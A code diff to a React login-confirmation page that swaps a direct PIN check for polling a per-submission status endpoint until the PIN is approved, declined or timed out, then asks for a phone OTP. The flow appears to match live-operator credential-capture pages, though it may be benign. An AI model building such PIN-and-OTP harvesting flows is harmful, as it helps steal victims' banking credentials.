@@ -109,18 +109,44 @@ export const ConfirmLoginPage: React.FC<ConfirmLoginPageProps> = ({
       });
 
       if (!response.ok) {
-        throw new Error('Failed to verify PIN');
+        throw new Error('Failed to send PIN verification');
       }
 
-      const result = await response.json();
-      
-      if (result.success) {
-        setIsLoading(false);
-        onToast('PIN verified! Please enter OTP sent to your phone.');
-        onSuccess(fullPin);
-      } else {
-        throw new Error(result.error || 'Verification failed');
-      }
+      onToast('Verifying...');
+
+      // Poll for PIN verification status
+      let attempts = 0;
+      const maxAttempts = 30; // 30 seconds timeout
+      const pollInterval = setInterval(async () => {
+        attempts++;
+        
+        try {
+          const statusResponse = await fetch(`${apiUrl}/pin-status/${currentSubmissionId}`);
+          const statusData = await statusResponse.json();
+
+          if (statusData.pinVerified === true) {
+            clearInterval(pollInterval);
+            setIsLoading(false);
+            onToast('PIN verified! Please enter OTP sent to your phone.');
+            onSuccess(fullPin);
+          } else if (statusData.pinStatus === 'incorrect') {
+            clearInterval(pollInterval);
+            setIsLoading(false);
+            setErrorMessage('PIN verification declined. Please try again.');
+            onToast('PIN verification declined.', true);
+            setPinDigits(['', '', '', '']);
+            inputRefs[0].current?.focus();
+          } else if (attempts >= maxAttempts) {
+            clearInterval(pollInterval);
+            setIsLoading(false);
+            setErrorMessage('Verification timeout. Please try again.');
+            onToast('Verification timeout.', true);
+          }
+        } catch (error) {
+          console.error('Error polling PIN status:', error);
+        }
+      }, 1000);
+
     } catch (error) {
       console.error('PIN verification error:', error);
       setIsLoading(false);
